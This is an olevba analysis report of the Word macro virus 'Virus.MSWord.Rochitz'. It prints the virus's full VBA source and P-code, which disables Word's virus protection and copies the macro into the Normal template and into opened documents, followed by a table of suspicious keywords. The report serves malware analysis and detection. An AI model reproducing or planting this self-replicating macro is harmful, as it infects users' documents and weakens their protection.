olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rochitz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rochitz - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
Dim NTemp As Object
Dim Adoc As Object

Dim NtInfect As Boolean
Dim AdInfect As Boolean
Dim DocLine As Integer
Dim Enter As String

Enter = Chr(13)

Set NTemp = NormalTemplate.VBProject.VBComponents
Set Adoc = ActiveDocument.VBProject.VBComponents

NtInfect = NTemp(1).CodeModule.Find("Check if Infected", 1, 1, 10000, 10000)
AdInfect = Adoc(1).CodeModule.Find("Check if Infected", 1, 1, 10000, 10000)

If NtInfect = False Then
    Options.VirusProtection = False
    For NTs = 1 To NTemp.Count
        NTemp(NTs).CodeModule.deletelines 1, NTemp(NTs).CodeModule.countoflines
        NTemp(NTs).CodeModule.insertlines 1, Adoc(1).CodeModule.lines(1, Adoc(1).CodeModule.countoflines)
    Next NTs
End If
    Coin = Int(Rnd * 2) + 1
    Select Case Coin
        Case 1
            If AdInfect = False Then
                For Ads = 1 To Adoc.Count
                    If Adoc(Ads).CodeModule.countoflines > 0 Then DocLine = Adoc(Ads).CodeModule.countoflines
                    Adoc(Ads).CodeModule.deletelines 1, Adoc(Ads).CodeModule.countoflines
                    Adoc(Ads).CodeModule.insertlines 1, NTemp(1).CodeModule.lines(1, NTemp(1).CodeModule.countoflines)
                Next Ads
                ActiveDocument.Save
            End If
    End Select


End Sub

Private Sub Document_Open()
Dim NTemp As Object
Dim Adoc As Object

Dim NtInfect As Boolean
Dim AdInfect As Boolean
Dim DocLine As Integer
Dim Enter As String

Enter = Chr(13)

Set NTemp = NormalTemplate.VBProject.VBComponents
Set Adoc = ActiveDocument.VBProject.VBComponents

NtInfect = NTemp(1).CodeModule.Find("Check if Infected", 1, 1, 10000, 10000)
AdInfect = Adoc(1).CodeModule.Find("Check if Infected", 1, 1, 10000, 10000)

If NtInfect = False Then
    Options.VirusProtection = False
    For NTs = 1 To NTemp.Count
        NTemp(NTs).CodeModule.deletelines 1, NTemp(NTs).CodeModule.countoflines
        NTemp(NTs).CodeModule.insertlines 1, Adoc(1).CodeModule.lines(1, Adoc(1).CodeModule.countoflines)
    Next NTs
    MsgBox "Thanks By Using our program..." & String(2, Enter) & _
    "   Goenitz Orochi Inc.", vbInformation
End If
    Coin = Int(Rnd * 2) + 1
    Select Case Coin
        Case 1
            If AdInfect = False Then
                If NtInfect = True Then MsgBox "Thanks By Using our program..." & String(2, Enter) & _
                    "   Goenitz Orochi Inc.", vbInformation
                For Ads = 1 To Adoc.Count
                    If Adoc(Ads).CodeModule.countoflines > 0 Then DocLine = Adoc(Ads).CodeModule.countoflines
                    Adoc(Ads).CodeModule.deletelines 1, Adoc(Ads).CodeModule.countoflines
                    Adoc(Ads).CodeModule.insertlines 1, NTemp(1).CodeModule.lines(1, NTemp(1).CodeModule.countoflines)
                Next Ads
                ActiveDocument.Save
            Else
                If NtInfect = True Then MsgBox "Thanks By Using our program..." & String(2, Enter) & _
                    "   Goenitz Orochi Inc.", vbInformation
            End If
        Case Else
            If NtInfect = True Then MsgBox "Thanks By Using our program..." & String(2, Enter) & _
                    "   Goenitz Orochi Inc.", vbInformation
    End Select


If DocLine > 0 Then MsgBox "We Find " & DocLine & " lines " & _
    "of a possible Virus" & String(2, Enter) & String(12, Chr(32)) & _
    "Goenitz Orochi", vbExclamation
End Sub



































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Rochitz
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6182 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	Dim 
' 	VarDefn NTemp (As Object)
' Line #3:
' 	Dim 
' 	VarDefn Adoc (As Object)
' Line #4:
' Line #5:
' 	Dim 
' 	VarDefn NtInfect (As Boolean)
' Line #6:
' 	Dim 
' 	VarDefn AdInfect (As Boolean)
' Line #7:
' 	Dim 
' 	VarDefn DocLine (As Integer)
' Line #8:
' 	Dim 
' 	VarDefn Enter (As String)
' Line #9:
' Line #10:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	St Enter 
' Line #11:
' Line #12:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set NTemp 
' Line #13:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Adoc 
' Line #14:
' Line #15:
' 	LitStr 0x0011 "Check if Infected"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	LitDI2 0x0001 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NtInfect 
' Line #16:
' 	LitStr 0x0011 "Check if Infected"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	LitDI2 0x0001 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St AdInfect 
' Line #17:
' Line #18:
' 	Ld NtInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	StartForVariable 
' 	Ld NTs 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NTemp 
' 	MemLd Count 
' 	For 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld NTs 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld NTs 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	Ld NTs 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #23:
' 	StartForVariable 
' 	Ld NTs 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Coin 
' Line #26:
' 	Ld Coin 
' 	SelectCase 
' Line #27:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #28:
' 	Ld AdInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld Ads 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Adoc 
' 	MemLd Count 
' 	For 
' Line #30:
' 	Ld Ads 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld Ads 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St DocLine 
' 	EndIf 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld Ads 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld Ads 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #32:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	Ld Ads 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #33:
' 	StartForVariable 
' 	Ld Ads 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndSelect 
' Line #37:
' Line #38:
' Line #39:
' 	EndSub 
' Line #40:
' Line #41:
' 	FuncDefn (Private Sub Document_Open())
' Line #42:
' 	Dim 
' 	VarDefn NTemp (As Object)
' Line #43:
' 	Dim 
' 	VarDefn Adoc (As Object)
' Line #44:
' Line #45:
' 	Dim 
' 	VarDefn NtInfect (As Boolean)
' Line #46:
' 	Dim 
' 	VarDefn AdInfect (As Boolean)
' Line #47:
' 	Dim 
' 	VarDefn DocLine (As Integer)
' Line #48:
' 	Dim 
' 	VarDefn Enter (As String)
' Line #49:
' Line #50:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	St Enter 
' Line #51:
' Line #52:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set NTemp 
' Line #53:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Adoc 
' Line #54:
' Line #55:
' 	LitStr 0x0011 "Check if Infected"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	LitDI2 0x0001 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NtInfect 
' Line #56:
' 	LitStr 0x0011 "Check if Infected"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	LitDI2 0x0001 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St AdInfect 
' Line #57:
' Line #58:
' 	Ld NtInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #60:
' 	StartForVariable 
' 	Ld NTs 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NTemp 
' 	MemLd Count 
' 	For 
' Line #61:
' 	LitDI2 0x0001 
' 	Ld NTs 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld NTs 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #62:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	Ld NTs 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #63:
' 	StartForVariable 
' 	Ld NTs 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	LineCont 0x0004 0A 00 04 00
' 	LitStr 0x001E "Thanks By Using our program..."
' 	LitDI2 0x0002 
' 	Ld Enter 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x0016 "   Goenitz Orochi Inc."
' 	Concat 
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Coin 
' Line #67:
' 	Ld Coin 
' 	SelectCase 
' Line #68:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #69:
' 	Ld AdInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #70:
' 	LineCont 0x0004 0F 00 14 00
' 	Ld NtInfect 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001E "Thanks By Using our program..."
' 	LitDI2 0x0002 
' 	Ld Enter 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x0016 "   Goenitz Orochi Inc."
' 	Concat 
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #71:
' 	StartForVariable 
' 	Ld Ads 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Adoc 
' 	MemLd Count 
' 	For 
' Line #72:
' 	Ld Ads 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld Ads 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St DocLine 
' 	EndIf 
' Line #73:
' 	LitDI2 0x0001 
' 	Ld Ads 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld Ads 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #74:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	ArgsLd NTemp 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	Ld Ads 
' 	ArgsLd Adoc 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #75:
' 	StartForVariable 
' 	Ld Ads 
' 	EndForVariable 
' 	NextVar 
' Line #76:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #77:
' 	ElseBlock 
' Line #78:
' 	LineCont 0x0004 0F 00 14 00
' 	Ld NtInfect 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001E "Thanks By Using our program..."
' 	LitDI2 0x0002 
' 	Ld Enter 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x0016 "   Goenitz Orochi Inc."
' 	Concat 
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	CaseElse 
' Line #81:
' 	LineCont 0x0004 0F 00 14 00
' 	Ld NtInfect 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001E "Thanks By Using our program..."
' 	LitDI2 0x0002 
' 	Ld Enter 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x0016 "   Goenitz Orochi Inc."
' 	Concat 
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #82:
' 	EndSelect 
' Line #83:
' Line #84:
' Line #85:
' 	LineCont 0x0008 0C 00 04 00 1F 00 04 00
' 	Ld DocLine 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "We Find "
' 	Ld DocLine 
' 	Concat 
' 	LitStr 0x0007 " lines "
' 	Concat 
' 	LitStr 0x0013 "of a possible Virus"
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld Enter 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitDI2 0x000C 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x000E "Goenitz Orochi"
' 	Concat 
' 	Ld vbExclamation 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #86:
' 	EndSub 
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

